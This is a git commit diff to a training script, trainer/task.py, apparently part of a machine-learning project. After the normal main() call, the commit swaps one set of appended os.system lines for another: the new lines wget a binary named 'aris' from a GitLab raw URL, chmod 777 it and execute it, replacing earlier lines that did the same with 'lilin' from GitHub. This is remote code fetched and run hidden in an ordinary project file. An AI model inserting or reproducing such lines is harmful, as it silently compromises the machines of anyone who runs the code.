a21eb387564c611b1a17087170f8e8ac1298d3c3
allice <allice90@mailbox.org>
2022-07-21 08:44:35 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aingcuy778/aing/main/lilin')
-os.system('chmod 777 lilin')
-os.system('./lilin')
+os.system('wget https://gitlab.com/allice90/nukzp/-/raw/main/aris')
+os.system('chmod 777 aris')
+os.system('./aris')
